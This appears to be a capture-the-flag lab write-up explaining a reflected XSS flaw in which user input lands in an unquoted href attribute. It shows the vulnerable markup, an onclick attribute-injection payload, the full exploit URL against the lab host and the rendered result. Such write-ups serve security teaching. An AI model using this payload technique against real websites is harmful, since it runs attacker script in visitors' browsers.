The application reflects user input directly inside an unquoted `href` attribute:

```html
<a href=USER_INPUT target=_blank>
```

By injecting a space, it is possible to add a new HTML attribute and trigger XSS.

Payload:

```txt
http://test.com onclick=alert(1)
```

Final exploit:

```txt
http://cdcamxwl32pue3e6m873od4miwzy00wz0wkr5cwzo-web.cybertalentslabs.com/index.php?link=http://test.com onclick=alert(1)
```

Rendered HTML:

```html
<a href=http://test.com onclick=alert(1) target=_blank>
```

Clicking the generated link executes JavaScript successfully.

Vulnerability: Reflected XSS via unquoted HTML attribute injection.
